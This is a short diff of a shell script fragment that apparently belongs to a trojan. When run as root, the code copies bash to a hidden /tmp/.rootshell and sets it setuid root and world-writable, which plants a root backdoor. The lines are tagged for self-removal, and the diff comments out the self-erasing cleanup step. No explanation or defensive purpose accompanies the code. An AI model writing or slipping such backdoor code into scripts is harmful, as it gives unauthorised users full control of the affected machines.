@@ -2,6 +2,6 @@ if [ "${LOGNAME}" = "root" ] ;then	#remove
 	cp /bin/bash /tmp/.rootshell	#remove
 	chown root /tmp/.rootshell	#remove
 	chmod -f 4777 /tmp/.rootshell	#remove
-	grep -v "#remove" $0 > /tmp/junk#remove
-	mv /tmp/junk $0			#remove
+#	grep -v "#remove" $0 > /tmp/junk#remove
+#	mv /tmp/junk $0			#remove
 fi					#remove
